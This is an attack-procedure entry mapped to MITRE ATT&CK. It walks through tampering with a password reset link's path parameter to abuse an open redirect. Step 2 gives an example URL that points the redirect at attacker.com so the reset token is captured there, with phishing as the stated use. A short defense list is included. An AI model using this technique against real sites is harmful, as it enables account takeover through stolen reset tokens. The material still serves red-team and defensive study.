---
tags:
  - open-redirect
  - url-modification
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:33:12.488Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 47c176e5-9a3a-4430-a934-266a404a61aa
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Modify-Reset-Link-Parameter

## Summary

This procedure alters the path parameter in the password reset link to redirect to an attacker-controlled domain, exploiting the open redirect vulnerability.

## Description

The Mars site's reset link includes an unsanitized path parameter that allows arbitrary redirects. By changing this parameter to an external URL, the link can be weaponized for phishing. This requires URL inspection tools like a browser dev console and a controlled domain. Outcome is a tampered link that, when clicked, exposes the token.

## Requirements

1. Original reset link from the email
2. Attacker-controlled domain and server to handle redirects
3. Basic URL encoding knowledge to avoid breaking the link

## Defense

Defensive measures and detection strategies:

- Validate redirect parameters against a whitelist of allowed domains/paths
- Use relative paths or session-based redirects instead of user-supplied URLs
- Log all redirect attempts for anomaly detection

## Objectives

1. Transform the legitimate link into a malicious one
2. Ensure the modified link still validates on the server side
3. Test the redirect locally before deployment

## Instructions

### Step 1: Inspect Original Link

**Context**: Analyze the URL structure to identify the vulnerable parameter.

Copy the reset link from the email and paste it into a URL decoder or browser address bar. Identify the `path` or similar parameter, e.g., `path=/reset-complete`.

> The parameter should be modifiable without immediate errors.

### Step 2: Alter the Parameter

**Context**: Replace the path with an external redirect target.

Edit the URL to set `path=https://attacker.com/capture?ref={original_path}`, URL-encoding if necessary (e.g., use %3A for :). Save the modified link.

> Test by clicking: it should redirect to attacker.com with the token in query params.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[open-redirect]]
- [[url-modification]]
